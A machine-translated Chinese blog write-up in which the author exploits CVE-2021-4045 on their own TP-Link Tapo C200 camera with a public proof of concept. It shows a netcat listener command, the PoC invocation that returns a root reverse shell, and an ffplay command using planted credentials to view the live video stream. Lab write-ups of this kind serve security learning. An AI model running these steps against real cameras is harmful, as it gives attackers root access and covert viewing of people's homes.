# 入侵 Wi-Fi 摄像头 TP-Link Tapo C200(CVE-2021–4045)

> 原文：<https://infosecwriteups.com/hacking-into-wi-fi-camera-tp-link-tapo-c200-cve-2021-4045-4c4e43115864?source=collection_archive---------1----------------------->

![](img/57989af6388066335cfa1a2a5d2fd24b.png)

有一天，在例行的每日漏洞数据库读取期间，我发现了一个有趣的漏洞(CVE-2021–4045 ),是关于我自己的 Wi-Fi 摄像头的。我很久以前买了这个相机，用来在我的宝宝睡觉时监控他。这台相机在壁橱里放了很长时间，所以我敢肯定固件有一段时间没有升级，我很有可能这个 CVE 影响了我的固件版本。我发现我的相机固件版本是 1.1.11。不错，让摇滚，漏洞影响 1.1.16 Build 211209 Rel 之前的所有固件版本。37726N，所以我应该很容易黑进我的。

我不会深究这个漏洞的作者( [Victor Fresk0](https://twitter.com/hacefresko) )是如何完成伟大的逆向工程的整个故事。如果你有兴趣详细研究，查看下面的[链接](https://www.hacefresko.com/posts/tp-link-tapo-c200-unauthenticated-rce)。我将向您展示，由于 uhttpd 中对用户输入的检查不足，使用命令注入可以轻松完成 RCE 和流。

所以，我们开始吧。首先，我检查并读出了我在 [github](https://github.com/hacefresko/CVE-2021-4045-PoC) 上找到的源代码。

代码已经根据我的需要修改了 NC_COMMAND。

第一次尝试时，我遇到了一个错误。我在代码中遇到了 NC_COMMAND 的问题。我在代码中对这个 netcat 命令做了一些调整，并按照我所知道的它在 Linux Parrot OS 中通常适用的方式进行了修改。

```
NC_COMMAND = 'nc -lvp %d' % PORT
```

然后我再次尝试这个命令，它成功了。

RCE 司令部:

```
sudo python3 tapo.py shell 192.168.64.103 192.168.64.101
```

*记得更改相机和 PC 的 IP。在我的例子中，192.168.64.101 是相机的 IP，192.168.64.103 是 PC 的 IP。*

![](img/09114a3cce811213868559809297f082.png)

如您所见，我收到了 root 用户 id 的 shell。

然后我还尝试了 rtsp(实时流协议),它可以访问实时视频流。

```
sudo python3 tapo.py rtsp 192.168.64.103 192.168.64.101
```

![](img/b45ecb2bf3dbc4d18f4312dbdb8dc1ba.png)

这段代码的执行将为您提供所需的 rtsp 链接和凭证。对于流媒体，你可以使用任何支持 rtsp 协议的播放器。在我的例子中，我使用了播放器 ffplay。

接下来我运行代码:

```
sudo ffplay rtsp://pwned1337:pwned1337@192.168.64.103/stream2
```

![](img/9620c0092e715aaead1106638a3f1491.png)

开始了，我播放了我的 TP-Link Tapo C200 的视频。

## 来自 Infosec 的报道:Infosec 每天都有很多内容，很难跟上。[加入我们的每周简讯](https://weekly.infosecwriteups.com/)以 5 篇文章、4 个线程、3 个视频、2 个 GitHub Repos 和工具以及 1 个工作提醒的形式免费获取所有最新的 Infosec 趋势！